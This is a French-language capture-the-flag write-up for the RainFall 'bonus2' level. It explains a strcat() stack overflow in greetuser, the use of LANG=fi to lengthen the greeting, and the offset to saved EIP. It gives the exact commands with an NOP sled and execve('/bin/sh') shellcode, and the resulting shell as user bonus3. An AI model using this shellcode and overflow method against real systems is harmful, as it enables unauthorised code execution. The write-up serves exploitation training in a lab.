# bonus02

Vu que l on a la protection "GCC stack protector support" d'activer, nous devons utiliser la ligne suivante dans gdb afin de garder des adresses coherentes avec une utilisation sans gbd:
set exec-wrapper env -u LINES -u COLUMNS

Si argc n'est pas egal a 3, le programme se termine et retourne 1 (main+15)

set exec-wrapper env -i LANG="fi"

bonus2@RainFall:~$ echo $LANG
fi

A greetuser+147 nous avons un strcat() avec l adresse de la destination a 0xbffff260 et save $eip a l adresse 0xbffff2ac, ce qui nous permet d'ecraser sa valeur si l'adresse de destination atteint 80 bytes (0xbffff2ac-0xbffff260 = 76 + les 4 bytes de l'adresse a overwrite) et ne pas retourner a main+263, mais sur l adresse de notre shellcode

bonus2@RainFall:~$ export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\x78\xf7\xff\xbf"')Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB���
$ whoami
bonus3
$ echo "You are the bonus3 user"
You are the bonus3 user
$


Premier argument du main dans le main: 0xbfffd836
	Dans la fonction greetuser: 0xbfffd5a0

Le tout dans greetuser: 0xbffff462

0xbffff4f0


r $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\x1e\xf5\xff\xbf" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

